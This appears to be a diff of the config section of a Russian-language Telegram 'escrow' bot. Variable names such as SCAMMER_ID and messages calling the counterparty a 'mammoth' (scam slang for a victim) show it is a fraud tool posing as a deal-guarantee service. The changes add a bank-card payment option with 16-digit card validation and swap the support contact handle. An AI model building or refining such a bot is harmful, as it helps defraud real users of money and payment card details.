@@ -8,11 +8,11 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_IDS = [8187269902]
 SCAMMER_ID = 8187269902
 SCAMMER_USERNAME = "@MalonGarant"
-SUPPORT_USERNAME = "@MalonGarant"
+SUPPORT_USERNAME = "@helper_deal"
 COMMISSION = 3.0
 WELCOME_GIF_PATH = "gifs/welcome.gif.mp4"
 
-# ПРЕМИУМ ЭМОДЗИ
+# ========== ПРЕМИУМ ЭМОДЗИ ==========
 E_BANK = '<tg-emoji emoji-id="5224607267797606837">🏦</tg-emoji>'
 E_DEAL = '<tg-emoji emoji-id="5980871942570251958">💎</tg-emoji>'
 E_GRAM = '<tg-emoji emoji-id="5980783470538921933">🪙</tg-emoji>'
@@ -41,20 +41,22 @@ E_DOWN = '<tg-emoji emoji-id="5443127283898405358">👇</tg-emoji>'
 E_RU = '<tg-emoji emoji-id="5291734595862018096">🇷🇺</tg-emoji>'
 E_US = '<tg-emoji emoji-id="5294447773947543583">🇺🇸</tg-emoji>'
 E_TR = '<tg-emoji emoji-id="5292218402453075461">🇹🇷</tg-emoji>'
+E_GIFT = '<tg-emoji emoji-id="5981137191160518179">⭐</tg-emoji>'  # для звёзд в сумме
+
+CURRENCIES = {
+    "gram": "грам",
+    "card": "карта",
+    "stars": "звезд"
+}
 
 ERROR_MESSAGES = {
     "no_requisites": f"{E_WARNING} <b>У вас ещё не добавлен реквизит!</b>\n\nДобавьте его здесь: Главное меню → Реквизиты → Добавить",
     "invalid_gram": f"{E_WARNING} <b>Вы указали неверный адрес кошелька!</b>\n\n❗ Формат: откройте кошелёк -> скопируйте точный адрес -> вставьте скопированный текст",
+    "invalid_card": f"{E_WARNING} <b>Неверный формат карты!</b>\n\nВведите 16 цифр",
     "deal_not_found": f"{E_CROSS} <b>Сделка не найдена.</b>",
     "deal_already_paid": f"{E_CROSS} <b>Эта сделка уже оплачена или завершена.</b>",
     "deal_not_joined": f"{E_CROSS} <b>Мамонт ещё не присоединился к сделке.</b>",
     "access_denied": f"{E_CROSS} <b>Доступ запрещён.</b>",
     "invalid_amount": f"{E_CROSS} <b>Введите корректное число</b>",
     "description_too_long": f"{E_CROSS} <b>Описание слишком длинное (макс 200 символов)</b>"
-}
-
-CURRENCIES = {
-    "gram": "грам",
-    "stars": "звезд",
-    "rub": "рублей"
 }
